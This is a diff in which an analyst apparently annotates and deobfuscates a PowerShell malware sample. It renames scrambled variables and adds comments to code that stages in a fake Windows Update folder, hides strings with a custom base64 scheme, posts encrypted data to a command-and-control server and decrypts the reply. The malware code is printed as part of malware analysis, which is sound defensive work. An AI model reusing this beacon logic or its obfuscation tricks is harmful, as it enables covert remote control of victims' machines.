@@ -39,7 +39,7 @@ function gb {
 
 $fake_Windows_Update_Path = "C:\Users\$env:username\AppData\Local\Microsoft\Windows\Update\"
 cd $fake_Windows_Update_Path
-#Replaces all '-' with 'H' and replace all '@' with 'a' then return the decoded x64 value as UTF8 byte array
+#Replaces all '-' with 'H' and replace all '@' with 'a' then return the decoded x64 value as UTF8 byte array. Does this to obfuscate the x64
 function weirdx64Convert {
 	param (
 		[parameter(Mandatory = $true)]
@@ -134,12 +134,12 @@ if ($args_if_args_not_RES -ne (weirdx64Convert('Og=='))) {
 	$WebClientObject = New-Object System.$Net_$WebC$lien$t
 	#Add User agent to the header plus Generic_String_List's first element which could be something like application/urlencoded or whatever
 	$WebClientObject.Headers.Add((weirdx64Convert('VXNlckFnZW50')), $generic_string_List[0])
-	#Post the String to the C2Destination
+	#Post the String to the C2Destination.
 	$C2_Dest_Response = $WebClientObject.UploadData($C2_Destination, $Encrypted_Empty_String_01_E)
-	#Decrypt the C2 Server Response
-	$ZSJMIwUuYfmZCROmTwyvsQQftVRbdqlPzBBZfwtvsHkXC = $Decryptolator.TransformFinalBlock($C2_Dest_Response, 0, $C2_Dest_Response.Length)
+	#Decrypt the C2 Server Response. Not bothering to 
+	$C2_Server_Response_Decrypted = $Decryptolator.TransformFinalBlock($C2_Dest_Response, 0, $C2_Dest_Response.Length)
 	# Decode the response
-	$sdCjUzeBpaFwnpiLBFqdotOkVyruFEXVnTlliWcWuO = x64_Decode_UTF8 -bb $ZSJMIwUuYfmZCROmTwyvsQQftVRbdqlPzBBZfwtvsHkXC
+	$C2_Server_Response_Decoded = x64_Decode_UTF8 -bb $C2_Server_Response_Decrypted
 	
 }
 
